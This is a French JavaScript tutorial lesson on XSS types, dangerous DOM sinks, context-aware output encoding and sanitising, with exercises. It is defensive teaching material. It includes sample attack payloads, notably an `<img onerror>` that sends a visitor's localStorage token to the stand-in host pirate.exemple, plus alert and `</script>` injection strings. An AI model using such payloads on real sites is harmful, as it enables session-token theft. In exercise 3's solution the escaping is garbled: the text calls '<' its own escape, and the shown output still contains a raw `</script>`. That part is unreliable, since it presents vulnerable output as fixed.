---
id: javascript-xss-et-encodage-de-sortie
title: "XSS, DOM XSS et encodage de sortie"
slug: xss-et-encodage-de-sortie
technology: javascript
level: advanced
module: securite-javascript
order: 1
estimatedMinutes: 45
difficulty: 4
xp: 110
prerequisites:
  - javascript-dom-modifier
  - javascript-http-cors
skills:
  - js-xss
tags:
  - javascript
  - securite
  - xss
---

## Objectifs

- Expliquer ce qu'est une faille XSS, et ce qu'un attaquant peut faire avec.
- Distinguer XSS stockée, réfléchie et basée sur le DOM, et repérer les sources et les puits dangereux.
- Insérer des données dans une page sans risque : `textContent`, `setAttribute`, création d'éléments.
- Encoder une sortie selon son contexte : texte HTML, attribut, URL, JavaScript.
- Assainir le HTML riche avec une bibliothèque éprouvée quand on ne peut pas s'en passer.

## Introduction

Le *cross-site scripting*, ou **XSS**, est l'une des failles les plus fréquentes du Web. Elle survient quand une donnée
contrôlée par un attaquant finit par être interprétée comme du **code** dans la page d'une autre personne. Ce code
s'exécute alors avec tous les droits de la page : il lit les données affichées, envoie des requêtes au nom de
l'utilisateur, vole un jeton stocké dans `localStorage`, modifie le formulaire de paiement.

La cause est toujours la même : un mélange entre **données** et **code**. Le remède aussi : garder les données à leur
place de données, en utilisant des API qui ne les interprètent pas, ou en les encodant pour le contexte où elles
apparaissent.

## Concept

| Type | D'où vient la donnée | Exemple |
| --- | --- | --- |
| stockée | la base de données, puis toutes les pages qui l'affichent | un commentaire contenant `<img src=x onerror=…>` |
| réfléchie | la requête, renvoyée telle quelle par le serveur | `/recherche?q=<script>…` affiché dans la page de résultats |
| DOM | une source lue par le JavaScript de la page | `location.hash` inséré avec `innerHTML` |

| Sources, données contrôlables | Puits, où une donnée devient du code |
| --- | --- |
| `location.search`, `location.hash`, `document.referrer` | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write` |
| `postMessage`, `localStorage`, réponses d'API | `eval`, `new Function`, `setTimeout` avec une chaîne |
| champs de formulaire, noms de fichiers, contenus d'utilisateurs | attributs d'événement `on…`, `href` et `src` avec `javascript:` |

| Contexte de sortie | Protection |
| --- | --- |
| texte d'un élément | `textContent`, ou encoder `&`, `<`, `>` |
| valeur d'attribut | `setAttribute`, ou encoder en plus `"` et `'`, attribut entre guillemets |
| URL dans `href` ou `src` | n'accepter que `http:` et `https:`, encoder les paramètres avec `URLSearchParams` |
| données dans un script | `JSON.stringify` puis échapper `<`, ou mieux, un attribut `data-` |
| HTML riche voulu | un assainisseur, comme DOMPurify, avec une liste blanche |

## Exemple

Une page affiche les commentaires d'un article. La version vulnérable construit du HTML par concaténation :

```js
function afficherCommentaireVulnerable(liste, commentaire) {
  liste.innerHTML += `<li><strong>${commentaire.auteur}</strong> : ${commentaire.texte}</li>`;
}

// Un commentaire enregistré par un attaquant :
afficherCommentaireVulnerable(document.querySelector('#commentaires'), {
  auteur: 'Mallory',
  texte: '<img src="x" onerror="fetch(\'https://pirate.exemple/?c=\' + localStorage.jeton)">',
});
```

Le navigateur analyse la chaîne comme du HTML, crée une image, ne parvient pas à la charger, et exécute l'attribut
`onerror` : le jeton de chaque visiteur part chez l'attaquant. C'est une XSS stockée. La version sûre crée les éléments
et y place le texte comme du texte :

```js
function afficherCommentaire(liste, { auteur, texte }) {
  const element = document.createElement('li');
  const nom = document.createElement('strong');
  nom.textContent = auteur;
  element.append(nom, ` : ${texte}`); // une chaîne passée à append devient un nœud texte
  liste.append(element);
}
```

Le même commentaire s'affiche littéralement, `<img src="x" onerror=…>`, sans rien exécuter. Vérifié dans Chromium :
avec la première version, le code de l'attaquant s'exécute ; avec la seconde, jamais.

## Comment ça fonctionne

**Pourquoi `innerHTML` est dangereux.** `innerHTML` confie la chaîne à l'analyseur HTML. Tout ce qui ressemble à une
balise devient une balise, et les attributs d'événement comme `onerror`, `onload` ou `onfocus` deviennent du code. Un
détail trompeur : une balise `<script>` insérée par `innerHTML` ne s'exécute **pas**, ce qui donne une fausse
impression de sécurité ; une image au `onerror` malveillant, elle, s'exécute. `textContent`, `append` avec une chaîne,
`setAttribute` et `createElement` ne passent jamais par l'analyseur : la donnée reste une donnée.

**La XSS basée sur le DOM.** Elle ne passe même pas par le serveur : le JavaScript de la page lit une source, par exemple
`new URLSearchParams(location.search).get('nom')`, et l'écrit dans un puits, comme `innerHTML`. Un lien piégé envoyé à
la victime suffit. Pour s'en protéger, on suit chaque donnée de sa source à son puits, et on remplace les puits
dangereux par des API sûres.

**Encoder selon le contexte.** Quand on doit produire du HTML sous forme de texte, par exemple côté serveur, on encode
les caractères qui ont un sens pour l'analyseur. Mais ce sens dépend de l'endroit : dans le texte d'un élément, `<` et
`&` suffisent ; dans un attribut, il faut aussi les guillemets, et l'attribut doit être entre guillemets ; dans une URL,
l'encodage HTML ne protège pas contre `javascript:alert(1)`, qui ne contient aucun caractère spécial. Chaque contexte a
sa règle, d'où l'expression **encodage de sortie contextuel**.

```js
const ENTITES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
const echapperHtml = (texte) => String(texte).replace(/[&<>"']/g, (c) => ENTITES[c]);

function urlSure(brute, base = 'https://atelier.exemple') {
  try {
    const url = new URL(brute, base);
    return ['http:', 'https:'].includes(url.protocol) ? url.href : null;
  } catch {
    return null;
  }
}

console.log(echapperHtml('<b onclick="x()">Tom & Jerry</b>'));
// &lt;b onclick=&quot;x()&quot;&gt;Tom &amp; Jerry&lt;/b&gt;
console.log(urlSure('/profil/ana')); // https://atelier.exemple/profil/ana
console.log(urlSure('javascript:alert(1)')); // null
console.log(urlSure('JaVaScRiPt:alert(1)')); // null : URL normalise le protocole en minuscules
```

**Le HTML riche.** Un éditeur de texte enrichi, un rendu Markdown ou un e-mail affiché dans la page produisent du HTML
qu'on veut garder, avec ses listes et son gras. On ne l'encode pas, on l'**assainit** : une bibliothèque éprouvée comme
DOMPurify analyse le HTML et ne garde que les balises et attributs d'une liste blanche. On n'écrit jamais son propre
filtre à base d'expressions régulières : les navigateurs acceptent trop de variantes pour qu'une liste noire soit
complète.

**Les frameworks aident, jusqu'à un point.** React, Vue, Angular ou Svelte échappent automatiquement les valeurs
insérées dans les gabarits. Mais ils offrent des échappatoires explicitement dangereuses : `dangerouslySetInnerHTML`,
`v-html`, `innerHTML` direct, et ils ne vérifient pas toujours le protocole d'une URL placée dans `href`. Chacun de ces
usages doit recevoir du contenu assaini ou contrôlé.

**La défense en profondeur.** Même avec un code soigné, une faille peut passer. D'autres couches en limitent l'impact :
une politique de sécurité du contenu, CSP, qui interdit les scripts en ligne, vue au chapitre suivant ; des cookies de
session `HttpOnly`, illisibles par JavaScript ; ne pas stocker de jetons sensibles dans `localStorage`, lisible par tout
script de la page ; et, dans Chromium, les *Trusted Types*, qui interdisent d'affecter une simple chaîne à
`innerHTML`.

## Erreurs fréquentes

**Construire du HTML par concaténation de données.** Crée les éléments et utilise `textContent`.

**Croire qu'un `<script>` bloqué suffit.** `<img onerror>`, `<svg>`, les attributs d'événement exécutent du code sans
balise `<script>`.

**Encoder en HTML une URL.** `javascript:` ne contient aucun caractère à encoder ; vérifie le protocole.

**Écrire son propre filtre anti-XSS.** Utilise un assainisseur maintenu, avec une liste blanche.

**Faire confiance aux données de sa propre base.** Une XSS stockée vient justement de là ; encode à l'affichage.

**Stocker un jeton d'authentification dans `localStorage`.** Toute XSS peut le lire ; préfère un cookie `HttpOnly`.

**Utiliser `dangerouslySetInnerHTML` ou `v-html` avec une donnée brute.** Assainis-la d'abord.

## À retenir

- XSS : une donnée d'un attaquant exécutée comme du code dans la page d'une victime.
- Stockée, réfléchie ou DOM : suivre chaque donnée de sa source à son puits.
- `textContent`, `append`, `setAttribute`, `createElement` gardent les données à leur place.
- L'encodage dépend du contexte : texte, attribut, URL, script.
- Le HTML riche s'assainit avec une bibliothèque et une liste blanche, jamais avec une expression régulière maison.
- Défense en profondeur : CSP, cookies `HttpOnly`, pas de jetons dans `localStorage`.

## Exercices

1. Cette page de recherche affiche le terme recherché. Explique l'attaque possible, écris l'URL qu'enverrait un
   attaquant, puis corrige le code.

   ```js
   const terme = new URLSearchParams(location.search).get('q') ?? '';
   document.querySelector('#titre').innerHTML = `Résultats pour « ${terme} »`;
   ```

   :::indice
   La source est l'URL, le puits `innerHTML`. Une image qui ne se charge pas peut exécuter du code.
   :::

   :::solution
   C'est une XSS basée sur le DOM. Un attaquant envoie à sa victime un lien comme
   `https://atelier.exemple/recherche?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E` ; la page insère
   l'image, et son `onerror` s'exécute avec les droits de la victime. La correction utilise une API qui n'interprète pas
   le HTML :

   ```js
   const terme = new URLSearchParams(location.search).get('q') ?? '';
   document.querySelector('#titre').textContent = `Résultats pour « ${terme} »`;
   ```

   Le terme s'affiche littéralement, balises comprises, et rien n'est exécuté.
   :::

2. Un profil affiche le site web de l'utilisateur dans un lien. Écris `creerLienSite(url, libelle)`, qui renvoie un
   élément `<a>` sûr : seules les URL `http:` et `https:` sont acceptées, sinon le lien est remplacé par du texte ; le
   lien s'ouvre dans un nouvel onglet sans donner accès à la page d'origine.

   :::indice
   `new URL` pour analyser, `url.protocol` pour vérifier, `rel="noopener noreferrer"` pour le nouvel onglet.
   :::

   :::solution
   ```js
   function creerLienSite(brute, libelle) {
     let url;
     try {
       url = new URL(brute);
     } catch {
       url = null;
     }
     if (!url || !['http:', 'https:'].includes(url.protocol)) {
       const texte = document.createElement('span');
       texte.textContent = libelle;
       return texte;
     }
     const lien = document.createElement('a');
     lien.href = url.href;
     lien.textContent = libelle;
     lien.target = '_blank';
     lien.rel = 'noopener noreferrer';
     return lien;
   }

   console.log(creerLienSite('https://ana.exemple', 'Site d’Ana').outerHTML);
   // <a href="https://ana.exemple/" target="_blank" rel="noopener noreferrer">Site d’Ana</a>
   console.log(creerLienSite('javascript:alert(1)', 'Piège').outerHTML);
   // <span>Piège</span>
   ```

   `noopener` empêche la page ouverte d'accéder à `window.opener`, et donc de rediriger l'onglet d'origine vers une
   fausse page de connexion. Le libellé passe par `textContent`, jamais par `innerHTML`.
   :::

3. Un serveur Node insère les données initiales d'une page dans un script en ligne :
   `` `<script>window.DONNEES = ${JSON.stringify(donnees)}</script>` ``. Montre qu'un nom d'utilisateur bien choisi
   permet d'injecter du code, puis propose deux corrections.

   :::indice
   Que se passe-t-il si une valeur contient `</script>` ? L'analyseur HTML le voit avant JavaScript.
   :::

   :::solution
   `JSON.stringify` produit du JSON valide, mais l'analyseur HTML ne connaît pas JSON : il ferme le script au premier
   `</script>` rencontré, même à l'intérieur d'une chaîne. Avec le nom `</script><img src=x onerror=alert(1)>`, la
   suite du texte est analysée comme du HTML, et l'image exécute le code.

   Première correction, échapper `<` dans le JSON : `<` est une écriture JSON valide du même caractère, que
   l'analyseur HTML ne reconnaît pas comme une balise.

   ```js
   const donnees = { nom: '</script><img src=x onerror=alert(1)>' };
   const json = JSON.stringify(donnees).replace(/</g, '\\u003c');
   console.log(`<script>window.DONNEES = ${json}</script>`);
   // <script>window.DONNEES = {"nom":"</script><img src=x onerror=alert(1)>"}</script>
   console.log(JSON.parse(json).nom === donnees.nom); // true : la valeur est intacte
   ```

   Seconde correction, souvent préférable : ne pas écrire de script en ligne, mais placer le JSON dans un élément
   `<script type="application/json" id="donnees">`, encodé de la même façon, ou dans un attribut `data-` encodé, et le
   lire avec `JSON.parse(element.textContent)`. Cela permet aussi une CSP qui interdit les scripts en ligne.
   :::

## Questions d'entretien

- Qu'est-ce qu'une faille XSS, et comment s'en protéger ?

  :::indice
  Données et code ; API sûres, encodage, assainissement, défense en profondeur.
  :::

  :::reponse
  C'est l'exécution, dans la page d'une victime, de code fourni par un attaquant, parce qu'une donnée a été interprétée
  comme du HTML ou du JavaScript. Elle peut être stockée, réfléchie ou basée sur le DOM. Pour s'en protéger : insérer
  les données avec des API qui ne les interprètent pas, comme `textContent` et `setAttribute` ; encoder selon le
  contexte quand on produit du HTML en texte ; vérifier le protocole des URL ; assainir le HTML riche avec une
  bibliothèque comme DOMPurify ; et limiter l'impact avec une CSP stricte, des cookies `HttpOnly` et aucun jeton sensible
  dans `localStorage`.
  :::

- Pourquoi un `<script>` inséré avec `innerHTML` ne s'exécute-t-il pas, et pourquoi `innerHTML` reste-t-il dangereux ?

  :::indice
  Pense aux attributs d'événement.
  :::

  :::reponse
  La spécification HTML prévoit que les scripts insérés par `innerHTML` ne sont pas exécutés. Mais le code d'un
  attaquant n'a pas besoin de balise `<script>` : un attribut d'événement comme `onerror` sur une image qui ne se charge
  pas, ou `onload`, `onfocus` avec `autofocus`, s'exécute dès que le navigateur crée l'élément. `innerHTML` transforme
  donc toute donnée non contrôlée en code potentiel. On le réserve à du HTML de confiance ou assaini.
  :::

- Pourquoi l'encodage HTML ne suffit-il pas pour une URL placée dans un `href` ?

  :::indice
  Que contient `javascript:alert(1)` comme caractères spéciaux ?
  :::

  :::reponse
  Parce que le danger n'est pas dans les caractères, mais dans le protocole : `javascript:alert(1)` ne contient ni `<`
  ni guillemet, et reste exécuté au clic une fois encodé. Pour une URL, il faut l'analyser avec `new URL` et n'accepter
  que les protocoles attendus, en général `http:` et `https:`, puis encoder les paramètres avec `URLSearchParams`.
  L'encodage de sortie dépend toujours du contexte.
  :::
